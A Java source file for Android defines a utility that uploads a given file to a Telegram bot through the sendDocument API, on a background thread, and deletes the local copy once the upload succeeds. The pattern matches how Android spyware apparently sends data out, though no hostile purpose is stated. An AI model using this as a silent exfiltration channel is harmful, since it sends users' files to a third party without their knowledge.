import android.content.Context;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MultipartUtility {
    public static void sendToTelegram(Context context, File file, String type) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String urlString = "https://api.telegram.org/bot" + Constants.TELEGRAM_BOT_TOKEN + "/sendDocument";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                
                // Add chat_id
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(Constants.TELEGRAM_CHAT_ID + "\r\n");

                // Add file
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush();
                dos.close();

                // Check response
                if (conn.getResponseCode() == 200) {
                    file.delete(); // Delete file after successful upload
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
